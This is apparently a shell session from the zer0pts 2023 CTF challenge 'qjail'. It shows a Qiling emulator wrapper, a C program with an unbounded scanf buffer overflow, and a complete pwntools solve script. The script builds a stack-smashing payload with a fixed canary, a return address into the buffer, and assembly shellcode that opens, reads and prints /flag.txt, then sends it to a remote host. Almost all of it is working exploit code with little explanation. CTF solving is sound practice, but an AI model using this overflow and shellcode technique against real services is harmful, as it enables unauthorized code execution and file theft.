#!/usr/bin/env python3
import qiling
import sys

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <ELF>")
        sys.exit(1)

    cmd = ['./lib/ld-2.31.so', '--library-path', '/lib', sys.argv[1]]
    ql = qiling.Qiling(cmd, console=False, rootfs='.')
    ql.run()
ubuntu@ip-172-31-24-131:~/zer0pts_23/qjail$ cat bin/vuln.c
#include <stdio.h>

int main() {
  char name[0x100];
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  puts("Enter something");
  scanf("%s", name);
  return 0;
}
ubuntu@ip-172-31-24-131:~/zer0pts_23/qjail$ cat solve.py
from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'
context.arch = 'amd64'


parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=9005,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "pwn.2023.zer0pts.com"
    port = 9005
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    if type(x) == str:
        x = x.encode("ascii")
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')

def sendline(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s)
    r.sendline(s)

def send(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()


# libc safe linking decrypt
def decrypt(cipher):
    key = 0
    plain  = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain

def encrypt(val, addr):
    return val ^ (addr >> 12)


####################################

def menu(choice):
    recvuntil(b':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=b': '):
    recvuntil(r)
    #s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

# send `s` after r
def sa(r, s, new_line=True):
    rs(s, new_line, r)

"""
int main(void) {
    char buf[100];
    int fd = openat(1, "/flag.txt", O_RDONLY);
    read(fd, buf, 100);
    write(1, buf, 100);
    return 0;
}
"""



main = 0x7fffb7dd71a9
canary = b"\x00aaaaaaa"
canary_addr = 0x80000000dd48
flagbuf = 0x80000000dc40
databuf = 0x80000000db40

payload = b"/flag.txt" + b"\x00" * 7
payload_addr = flagbuf + len(payload)
print(hex(payload_addr))

asm_payload = f"""
mov rdi, 1
mov rsi, {flagbuf}
mov rdx, 0
mov rax, 257
syscall
mov rdi, rax
mov rsi, {databuf}
mov rdx, 100
xor rax, rax
syscall
mov rdi, 1
mov rsi, {databuf}
mov rdx, 100
mov rax, 1
syscall
"""


asm_payload_bin = asm(asm_payload)
print("len: ", hex(len(asm_payload_bin)))
assert(len(asm_payload_bin) < 0x80)

payload += asm_payload_bin
payload += b"A" * (0x108 - len(payload))
payload += canary
payload += p64(payload_addr)
payload += p64(payload_addr)

recvuntil(b"Enter something")
sendline(payload)
#with open("../qjail_solver/payload", "wb") as f:
interactive()
